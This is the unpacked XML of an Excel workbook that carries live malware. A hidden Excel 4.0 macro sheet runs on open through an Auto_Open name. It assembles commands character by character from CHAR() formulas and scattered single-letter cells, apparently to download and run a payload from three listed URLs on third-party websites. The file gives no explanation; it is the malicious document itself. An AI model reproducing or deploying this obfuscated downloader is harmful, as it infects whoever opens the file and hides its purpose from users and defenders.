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macrosheets/sheet7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/>
  <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
      <x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" url="C:\Users\Админ\Desktop\Fil\23n\Cir\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{972B2769-3E60-4170-A9D9-FB405CC677A4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Ss1" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Ssbr2" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Ssbr3" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="EFEWF" sheetId="5" state="hidden" r:id="rId5"/>
    <sheet name="Buk1" sheetId="6" state="hidden" r:id="rId6"/>
    <sheet name="Buk2" sheetId="7" state="hidden" r:id="rId7"/>
    <sheet name="Buk3" sheetId="8" state="hidden" r:id="rId8"/>
    <sheet name="Buk4" sheetId="9" state="hidden" r:id="rId9"/>
    <sheet name="Buk5" sheetId="10" state="hidden" r:id="rId10"/>
    <sheet name="Buk6" sheetId="11" state="hidden" r:id="rId11"/>
    <sheet name="Buk7" sheetId="12" state="hidden" r:id="rId12"/>
  </sheets>
  <definedNames>
    <definedName name="LKLW">EFEWF!$D$3</definedName>
    <definedName name="SASA">EFEWF!$D$17</definedName>
    <definedName name="SASA1">EFEWF!$D$19</definedName>
    <definedName name="SASA2">EFEWF!$D$21</definedName>
    <definedName name="_xlnm.Auto_Open">EFEWF!$D$1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3" l="1"/>
  <c r="K10" i="3"/>
  <c r="Q3" i="3"/>
  <c r="O9" i="3" l="1"/>
  <c r="L5" i="3"/>
  <c r="B9" i="3"/>
  <c r="R11" i="2"/>
  <c r="G3" i="3"/>
  <c r="D5" i="3"/>
  <c r="B3" i="3"/>
  <c r="S46" i="2"/>
  <c r="E45" i="2"/>
  <c r="N43" i="2"/>
  <c r="R41" i="2"/>
  <c r="G40" i="2"/>
  <c r="J39" i="2"/>
  <c r="D39" i="2"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="81" uniqueCount="50">
  <si>
    <t>e</t>
  </si>
  <si>
    <t>r</t>
  </si>
  <si>
    <t>n</t>
  </si>
  <si>
    <t>l</t>
  </si>
  <si>
    <t>C</t>
  </si>
  <si>
    <t>a</t>
  </si>
  <si>
    <t>D</t>
  </si>
  <si>
    <t>i</t>
  </si>
  <si>
    <t>c</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>A</t>
  </si>
  <si>
    <t>J</t>
  </si>
  <si>
    <t>\</t>
  </si>
  <si>
    <t>,</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>o</t>
  </si>
  <si>
    <t>u</t>
  </si>
  <si>
    <t>m</t>
  </si>
  <si>
    <t>U</t>
  </si>
  <si>
    <t>R</t>
  </si>
  <si>
    <t>L</t>
  </si>
  <si>
    <t>w</t>
  </si>
  <si>
    <t>d</t>
  </si>
  <si>
    <t>T</t>
  </si>
  <si>
    <t>F</t>
  </si>
  <si>
    <t>B</t>
  </si>
  <si>
    <t>.</t>
  </si>
  <si>
    <t>&lt;</t>
  </si>
  <si>
    <t>(</t>
  </si>
  <si>
    <t>)</t>
  </si>
  <si>
    <t>S</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>E</t>
  </si>
  <si>
    <t>x</t>
  </si>
  <si>
    <t>g</t>
  </si>
  <si>
    <t>s</t>
  </si>
  <si>
    <t>v</t>
  </si>
  <si>
    <t>I</t>
  </si>
  <si>
    <t>X</t>
  </si>
  <si>
    <t>"</t>
  </si>
  <si>
    <t>=</t>
  </si>
  <si>
    <t>O</t>
  </si>
  <si>
    <t>&amp;</t>
  </si>
  <si>
    <t>W</t>
  </si>
  <si>
    <t>N</t>
  </si>
  <si>
    <t>b</t>
  </si>
  <si>
    <t>-</t>
  </si>
  <si>
    <t>"http://ielts-world.trimion.org/wp-content/uploads/0qkRwoQ1sl7/","</t>
  </si>
  <si>
    <t>"http://cuoihoitugia.com/aecidiostage/vkot3ACpTsf8jGua1h/","</t>
  </si>
  <si>
    <t>"https://tvtecom.vn/heterocellular/9bJnG9wfi3vL/","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</si>
</sst>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4C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4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Macrosheet" Target="macrosheets/sheet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12" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet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microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet6.xml"/><Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet1.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/><Relationship Id="rId10" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet5.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet4.xml"/><Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macro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14</xdr:col>
      <xdr:colOff>9525</xdr:colOff>
      <xdr:row>6</xdr:row>
      <xdr:rowOff>1184</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="3" name="Pictures">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3611E36E-8981-4CEC-8839-FCD0DD235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543925" cy="1201333"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:srgbClr val="FFF4CB"/>
        </a:solidFill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400-000000000000}">
  <dimension ref="D2"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="5.7109375" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="5.7109375" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D2" s="1" t="b">
        <f>FORMULA('Buk1'!E11,'Buk2'!B12)=FORMULA('Buk2'!H5,'Buk3'!H3)=FORMULA('Buk3'!C9,'Buk4'!C2)=FORMULA('Buk4'!I8,'Buk5'!F2)=FORMULA('Buk5'!B12,'Buk6'!B10)=FORMULA('Buk6'!G3,'Buk7'!I2)=FORMULA('Buk7'!D13,'Buk1'!A3)=FORMULA('Buk3'!H3&amp;'Ss1'!O6&amp;'Ss1'!D16&amp;'Ss1'!K13&amp;'Ss1'!R12&amp;'Ss1'!R14,D3)=FORMULA('Buk3'!H3&amp;'Buk7'!I2&amp;'Buk4'!C2&amp;'Buk5'!F2&amp;'Buk5'!F2&amp;Ssbr2!B3&amp;'Buk1'!A3&amp;Ssbr2!D5&amp;'Buk6'!B10&amp;Ssbr2!G3&amp;'Buk7'!I2&amp;'Buk7'!I2&amp;Ssbr2!B9,D17)=FORMULA('Buk3'!H3&amp;'Ss1'!H21&amp;'Ss1'!G23&amp;'Ss1'!R12&amp;"SASA"&amp;'Ss1'!R9&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;'Ss1'!R11&amp;'Buk7'!I2&amp;'Buk4'!C2&amp;'Buk5'!F2&amp;'Buk5'!F2&amp;Ssbr2!B3&amp;'Buk1'!A3&amp;Ssbr2!D5&amp;'Buk6'!B10&amp;Ssbr2!G3&amp;'Buk7'!I2&amp;'Buk7'!I2&amp;Ssbr2!L5&amp;'Ss1'!R14,D19)=FORMULA('Buk3'!H3&amp;'Ss1'!H21&amp;'Ss1'!G23&amp;'Ss1'!R12&amp;"SASA1"&amp;'Ss1'!R9&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;'Ss1'!R11&amp;'Buk7'!I2&amp;'Buk4'!C2&amp;'Buk5'!F2&amp;'Buk5'!F2&amp;Ssbr2!B3&amp;'Buk1'!A3&amp;Ssbr2!D5&amp;'Buk6'!B10&amp;Ssbr2!G3&amp;'Buk7'!I2&amp;'Buk7'!I2&amp;Ssbr2!O9&amp;'Ss1'!R14,D21)=FORMULA('Buk3'!H3&amp;'Ss1'!H21&amp;'Ss1'!G23&amp;'Ss1'!R12&amp;"SASA2"&amp;'Ss1'!R9&amp;'Ss1'!I8&amp;'Ss1'!R7&amp;'Ss1'!M20&amp;'Ss1'!K23&amp;'Ss1'!N24&amp;'Ss1'!P18&amp;'Ss1'!K18&amp;'Ss1'!R12&amp;'Ss1'!I8&amp;'Ss1'!R14&amp;'Ss1'!R7&amp;'Ss1'!R14,D23)=FORMULA('Buk3'!H3&amp;'Ss1'!J7&amp;'Ss1'!N15&amp;'Ss1'!J7&amp;'Ss1'!M20&amp;'Ss1'!R12&amp;'Ss1'!R16&amp;Ssbr2!Q3&amp;Ssbr2!K10&amp;Ssbr2!I1&amp;'Ss1'!R11&amp;'Ss1'!R5&amp;'Ss1'!R5&amp;'Ss1'!R3&amp;'Ss1'!P2&amp;'Ss1'!O1&amp;'Ss1'!O9&amp;'Ss1'!N5&amp;'Ss1'!F3&amp;'Ss1'!R5&amp;'Ss1'!B9&amp;'Ss1'!I12&amp;'Ss1'!K8&amp;'Ss1'!R7&amp;'Ss1'!R16&amp;'Ss1'!R18&amp;"LKLW"&amp;'Ss1'!R14,D25)=FORMULA('Buk3'!H3&amp;'Ss1'!K54&amp;'Ss1'!K56&amp;'Ss1'!J58&amp;'Ss1'!M52&amp;'Ss1'!K54&amp;'Ss1'!M61&amp;'Ss1'!R12&amp;'Ss1'!R14,D30)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dimension ref="A3:E11"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="3" spans="1:5" x14ac:dyDescent="0.25">
      <c r="A3" s="1" t="s">
        <v>1</v>
      </c>
    </row>
    <row r="11" spans="1:5" x14ac:dyDescent="0.25">
      <c r="E11" s="1" t="str">
        <f>CHAR('Ss1'!D39)</f>
        <v>o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600-000000000000}">
  <dimension ref="B5:H12"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="5" spans="2:8" x14ac:dyDescent="0.25">
      <c r="H5" s="1" t="str">
        <f>CHAR('Ss1'!E45)</f>
        <v>=</v>
      </c>
    </row>
    <row r="12" spans="2:8" x14ac:dyDescent="0.25">
      <c r="B12" s="1" t="s">
        <v>15</v>
      </c>
    </row>
  </sheetData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700-000000000000}">
  <dimension ref="C3:H9"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="3" spans="3:8" x14ac:dyDescent="0.25">
      <c r="H3" s="1" t="s">
        <v>40</v>
      </c>
    </row>
    <row r="9" spans="3:8" x14ac:dyDescent="0.25">
      <c r="C9" s="1" t="str">
        <f>CHAR('Ss1'!G40)</f>
        <v>A</v>
      </c>
    </row>
  </sheetData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800-000000000000}">
  <dimension ref="C2:I8"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="3:9" x14ac:dyDescent="0.25">
      <c r="C2" s="1" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="8" spans="3:9" x14ac:dyDescent="0.25">
      <c r="I8" s="1" t="str">
        <f>CHAR('Ss1'!J39)</f>
        <v>L</v>
      </c>
    </row>
  </sheetData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900-000000000000}">
  <dimension ref="B2:F12"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="2:6" x14ac:dyDescent="0.25">
      <c r="F2" s="1" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="12" spans="2:6" x14ac:dyDescent="0.25">
      <c r="B12" s="1" t="str">
        <f>CHAR('Ss1'!N43)</f>
        <v>e</v>
      </c>
    </row>
  </sheetData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A00-000000000000}">
  <dimension ref="B3:G10"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="3" spans="2:7" x14ac:dyDescent="0.25">
      <c r="G3" s="1" t="str">
        <f>CHAR('Ss1'!R41)</f>
        <v>C</v>
      </c>
    </row>
    <row r="10" spans="2:7" x14ac:dyDescent="0.25">
      <c r="B10" s="1" t="s">
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
</xm:macrosheet>
</file>

<file path=xl/macrosheets/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B00-000000000000}">
  <dimension ref="D2:I13"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="4:9" x14ac:dyDescent="0.25">
      <c r="I2" s="1" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="13" spans="4:9" x14ac:dyDescent="0.25">
      <c r="D13" s="1" t="str">
        <f>CHAR('Ss1'!S46)</f>
        <v>r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10"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="85" zoomScaleNormal="85" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" s="3" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="2" s="3" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="3" s="3" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="4" s="4" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="5" s="4" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="6" s="4" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="7" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="8" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="9" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="10" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="11" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="12" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="13" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="14" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="15" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="16" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="17" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="18" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="19" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="20" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="21" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="22" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="23" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="24" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="25" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="26" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="27" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="28" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="29" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="30" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="31" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="32" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="33" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="34" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="35" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="36" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="37" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="38" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="39" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="40" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="41" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="42" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="43" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="44" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="45" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="46" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="47" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="48" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="49" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="50" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="51" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="52" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="53" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="54" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="55" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="56" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="57" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="58" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="59" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="60" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="61" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="62" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="63" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="64" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="65" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="66" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="67" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="68" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="69" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="70" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="71" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="72" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="73" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="74" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="75" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="76" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="77" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="78" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="79" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="80" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="81" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="82" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="83" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="84" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="85" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="86" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="87" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="88" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="89" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="90" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="91" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="92" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="93" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="94" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="95" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="96" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="97" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="98" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="99" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="100" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="101" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="102" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="103" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="104" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="105" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="106" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="107" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="108" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="109" s="5" customFormat="1" ht="15.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="110" s="5" customFormat="1" ht="15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61"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:18" x14ac:dyDescent="0.25">
      <c r="J1" s="1" t="s">
        <v>25</v>
      </c>
      <c r="O1" s="1" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="2" spans="1:18" x14ac:dyDescent="0.25">
      <c r="A2" s="1" t="s">
        <v>16</v>
      </c>
      <c r="C2" s="1" t="s">
        <v>17</v>
      </c>
      <c r="E2" s="1" t="s">
        <v>2</v>
      </c>
      <c r="H2" s="1" t="s">
        <v>11</v>
      </c>
      <c r="K2" s="1" t="s">
        <v>30</v>
      </c>
      <c r="M2" s="1" t="s">
        <v>16</v>
      </c>
      <c r="P2" s="1" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="3" spans="1:18" x14ac:dyDescent="0.25">
      <c r="F3" s="1" t="s">
        <v>5</v>
      </c>
      <c r="L3" s="1" t="s">
        <v>31</v>
      </c>
      <c r="R3" s="1" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="4" spans="1:18" x14ac:dyDescent="0.25">
      <c r="B4" s="1" t="s">
        <v>1</v>
      </c>
      <c r="I4" s="1">
        <v>1</v>
      </c>
    </row>
    <row r="5" spans="1:18" x14ac:dyDescent="0.25">
      <c r="G5" s="1" t="s">
        <v>4</v>
      </c>
      <c r="N5" s="1" t="s">
        <v>9</v>
      </c>
      <c r="R5" s="1" t="s">
        <v>26</v>
      </c>
    </row>
    <row r="6" spans="1:18" x14ac:dyDescent="0.25">
      <c r="A6" s="1" t="s">
        <v>3</v>
      </c>
      <c r="E6" s="1" t="s">
        <v>22</v>
      </c>
      <c r="O6" s="1" t="s">
        <v>44</v>
      </c>
    </row>
    <row r="7" spans="1:18" x14ac:dyDescent="0.25">
      <c r="D7" s="1" t="s">
        <v>18</v>
      </c>
      <c r="H7" s="1" t="s">
        <v>7</v>
      </c>
      <c r="J7" s="1" t="s">
        <v>32</v>
      </c>
      <c r="M7" s="1" t="s">
        <v>36</v>
      </c>
      <c r="R7" s="1" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="8" spans="1:18" x14ac:dyDescent="0.25">
      <c r="I8" s="1">
        <v>0</v>
      </c>
      <c r="K8" s="1" t="s">
        <v>33</v>
      </c>
    </row>
    <row r="9" spans="1:18" x14ac:dyDescent="0.25">
      <c r="B9" s="1" t="s">
        <v>15</v>
      </c>
      <c r="F9" s="1" t="s">
        <v>23</v>
      </c>
      <c r="O9" s="1" t="s">
        <v>35</v>
      </c>
      <c r="R9" s="1" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="10" spans="1:18" x14ac:dyDescent="0.25">
      <c r="C10" s="1" t="s">
        <v>19</v>
      </c>
      <c r="H10" s="1" t="s">
        <v>0</v>
      </c>
      <c r="L10" s="1" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="11" spans="1:18" x14ac:dyDescent="0.25">
      <c r="E11" s="1" t="s">
        <v>24</v>
      </c>
      <c r="R11" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="12" spans="1:18" x14ac:dyDescent="0.25">
      <c r="B12" s="1" t="s">
        <v>6</v>
      </c>
      <c r="I12" s="1" t="s">
        <v>8</v>
      </c>
      <c r="M12" s="1" t="s">
        <v>34</v>
      </c>
      <c r="R12" s="1" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="13" spans="1:18" x14ac:dyDescent="0.25">
      <c r="A13" s="1" t="s">
        <v>20</v>
      </c>
      <c r="F13" s="1" t="s">
        <v>10</v>
      </c>
      <c r="K13" s="1" t="s">
        <v>43</v>
      </c>
    </row>
    <row r="14" spans="1:18" x14ac:dyDescent="0.25">
      <c r="D14" s="1" t="s">
        <v>21</v>
      </c>
      <c r="R14" s="1" t="s">
        <v>29</v>
      </c>
    </row>
    <row r="15" spans="1:18" x14ac:dyDescent="0.25">
      <c r="J15" s="1" t="s">
        <v>14</v>
      </c>
      <c r="N15" s="1" t="s">
        <v>38</v>
      </c>
    </row>
    <row r="16" spans="1:18" x14ac:dyDescent="0.25">
      <c r="D16" s="1" t="s">
